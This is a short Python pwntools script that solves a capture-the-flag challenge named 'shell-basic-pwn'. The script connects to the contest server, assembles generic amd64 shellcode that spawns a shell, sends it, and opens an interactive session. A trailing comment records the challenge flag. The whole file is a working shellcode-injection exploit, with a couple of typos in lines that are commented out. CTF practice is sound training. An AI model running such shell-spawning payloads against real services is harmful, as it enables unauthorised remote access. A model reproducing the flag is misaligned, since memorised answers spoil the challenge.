from pwn import *

host = "shell-basic-pwn.wanictf.org"
port = 9004
context(arch='amd64',os='linux')

# pc = proes(")
pc = remote(host,port)
# pc.recvuntil(b'hellcode: ')
shellcode = asm(shellcraft.amd64.sh())
pc.sendline(shellcode)
pc.interactive()
                      
#FLAG{NXbit_Blocks_shellcode_next_step_is_ROP}

